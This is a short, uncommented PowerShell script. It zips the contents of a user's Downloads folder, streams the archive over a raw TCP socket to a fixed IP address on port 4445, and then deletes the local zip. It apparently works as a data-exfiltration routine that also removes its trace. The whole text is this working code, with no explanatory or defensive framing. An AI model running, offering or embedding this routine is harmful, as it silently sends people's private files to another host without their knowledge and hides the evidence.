Compress-Archive -Path "C:\Users\TonUser\Downloads\*" -DestinationPath "C:\Temp\downloads.zip"

$client = New-Object System.Net.Sockets.TcpClient("10.184.27.88", 4445)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes("C:\Temp\downloads.zip")
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
Remove-Item "C:\Temp\downloads.zip"
